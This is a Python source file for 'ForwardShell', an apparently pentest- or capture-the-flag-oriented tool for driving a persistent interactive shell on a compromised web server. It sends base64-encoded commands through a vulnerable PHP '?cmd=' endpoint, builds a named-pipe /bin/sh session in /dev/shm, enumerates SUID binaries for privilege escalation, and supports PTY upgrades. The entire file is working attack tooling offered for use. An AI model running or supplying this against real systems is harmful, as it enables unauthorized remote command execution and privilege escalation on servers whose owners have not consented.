#!/usr/bin/env python3
"""
ForwardShell — HTTP-based forward shell for controlled environments.

Communicates with a remote server via HTTP, encoding commands in base64
and piping them through a named FIFO for persistent shell interaction.
"""

import logging
import time
from base64 import b64encode
from secrets import token_hex
from typing import Optional

import requests
from termcolor import colored

# ── Logging ───────────────────────────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
    level=logging.WARNING,
)
log = logging.getLogger(__name__)


# ── Constants ─────────────────────────────────────────────────────────────────
DEFAULT_URL = "http://localhost/index.php"
TIMEOUT = 5  # seconds per HTTP request
READ_RETRIES = 5  # number of stdout polling attempts
READ_DELAY = 0.2  # seconds between polls
FIFO_BASE = "/dev/shm"


class ForwardShell:
    """
    HTTP-based forward shell.

    Spawns a named-pipe shell on the target via a vulnerable PHP endpoint,
    then reads/writes through it over repeated HTTP requests — encoding all
    payloads as base64 to avoid character-filtering issues.

    Usage::

        shell = ForwardShell("http://10.10.10.1/index.php")
        shell.run()
    """

    BUILTIN_COMMANDS: dict[str, str] = {
        "help": "Show this help panel",
        "enum suid": "Enumerate binaries with the SUID bit set",
        "exit": "Exit the current pseudo-terminal session",
    }

    def __init__(self, url: str = DEFAULT_URL) -> None:
        session_id = token_hex(4)  # e.g. "3fa2c1b0"
        self.url = url
        self.stdin = f"{FIFO_BASE}/{session_id}.input"
        self.stdout = f"{FIFO_BASE}/{session_id}.output"
        self.is_pseudo_terminal = False
        self._http = requests.Session()  # reuse TCP connection
        log.debug("ForwardShell ready — session %s", session_id)

    # ── Private helpers ───────────────────────────────────────────────────────

    def _encode(self, command: str) -> str:
        """Return the base64-encoded form of *command*."""
        return b64encode(command.encode()).decode()

    def _http_get(self, cmd_payload: str) -> Optional[str]:
        """
        Send a single GET request carrying *cmd_payload* as ``?cmd=``.

        Returns the response body, or ``None`` on any network/HTTP error.
        """
        try:
            response = self._http.get(
                self.url,
                params={"cmd": cmd_payload},
                timeout=TIMEOUT,
            )
            response.raise_for_status()
            return response.text
        except requests.exceptions.Timeout:
            log.warning("Request timed out — target may be slow.")
        except requests.exceptions.ConnectionError as exc:
            log.error("Connection error: %s", exc)
        except requests.exceptions.HTTPError as exc:
            log.error("HTTP error %s: %s", exc.response.status_code, exc)
        return None

    # ── Shell primitives ──────────────────────────────────────────────────────

    def run_command(self, command: str) -> Optional[str]:
        """Execute *command* on the target and return its output."""
        payload = f"echo {self._encode(command)} | base64 -d | /bin/sh"
        return self._http_get(payload)

    def write_stdin(self, command: str) -> None:
        """Write *command* into the remote FIFO (stdin pipe)."""
        payload = f"echo {self._encode(command)} | base64 -d > {self.stdin}"
        self._http_get(payload)

    def read_stdout(self) -> Optional[str]:
        """
        Poll the remote stdout file up to *READ_RETRIES* times.

        Returns the last non-empty result, or ``None`` if the target
        produced no output within the polling window.
        """
        output: Optional[str] = None
        for _ in range(READ_RETRIES):
            result = self.run_command(f"/bin/cat {self.stdout}")
            if result:
                output = result
            time.sleep(READ_DELAY)
        return output

    def setup_shell(self) -> None:
        """Bootstrap the remote FIFO and start a persistent /bin/sh process."""
        command = (
            f"mkfifo {self.stdin}; "
            f"tail -f {self.stdin} | /bin/sh 2>&1 > {self.stdout}"
        )
        self.run_command(command)

    def remove_data(self) -> None:
        """Delete the remote FIFO and output file (safe cleanup on exit)."""
        self.run_command(f"/bin/rm -f {self.stdin} {self.stdout}")

    def clear_stdout(self) -> None:
        """Truncate the remote stdout file to prevent stale output leaking."""
        self.run_command(f"echo '' > {self.stdout}")

    # ── Built-in command handlers ─────────────────────────────────────────────

    def _handle_help(self) -> None:
        """Print the built-in command reference."""
        print(colored("\n[+] Built-in commands:\n", "blue"))
        for cmd, description in self.BUILTIN_COMMANDS.items():
            print(f"    {colored(cmd, 'cyan'):<20} {description}")
        print()

    def _handle_enum_suid(self) -> str:
        """Return the shell command for SUID binary enumeration."""
        return "find / -perm -4000 2>/dev/null | xargs ls -l"

    def _format_pty_output(self, raw: str) -> str:
        """
        Reorder PTY output so the prompt appears first.

        A pseudo-terminal typically returns::

            line[0]   echoed command
            line[1:]  actual output
            line[-1]  shell prompt

        We move the prompt to the top for a cleaner display.
        """
        lines = raw.split("\n")
        if len(lines) <= 2:
            return raw
        if len(lines) == 3:
            return "\n".join([lines[-1]] + lines[:1])
        return "\n".join([lines[-1]] + lines[:1] + lines[2:-1])

    # ── Main interactive loop ─────────────────────────────────────────────────

    def run(self) -> None:
        """Start the interactive forward-shell session."""
        print(colored("[*] Setting up forward shell…", "cyan"))
        self.setup_shell()
        print(colored("[+] Shell ready. Type 'help' for built-in commands.\n", "green"))

        while True:
            try:
                command = input(colored("fwd> ", "yellow")).strip()
            except EOFError:
                # Ctrl+D — exit cleanly
                break

            if not command:
                continue

            # ── Detect PTY upgrade ─────────────────────────────────────────
            if "script /dev/null -c bash" in command:
                print(colored("[+] Pseudo-terminal initiated.", "yellow"))
                self.is_pseudo_terminal = True

            # ── Built-in: help ─────────────────────────────────────────────
            if command == "help":
                self._handle_help()
                continue

            # ── Built-in: enum suid ────────────────────────────────────────
            if command == "enum suid":
                command = self._handle_enum_suid()

            # ── Send command ───────────────────────────────────────────────
            self.write_stdin(command + "\n")
            output = self.read_stdout()

            # ── Built-in: exit PTY ─────────────────────────────────────────
            if command == "exit" and self.is_pseudo_terminal:
                self.is_pseudo_terminal = False
                print(colored("[-] Exited pseudo-terminal.", "red"))
                self.clear_stdout()
                continue

            # ── Print output ───────────────────────────────────────────────
            if output:
                if self.is_pseudo_terminal:
                    print("\n" + self._format_pty_output(output) + "\n")
                else:
                    print(output)

            self.clear_stdout()
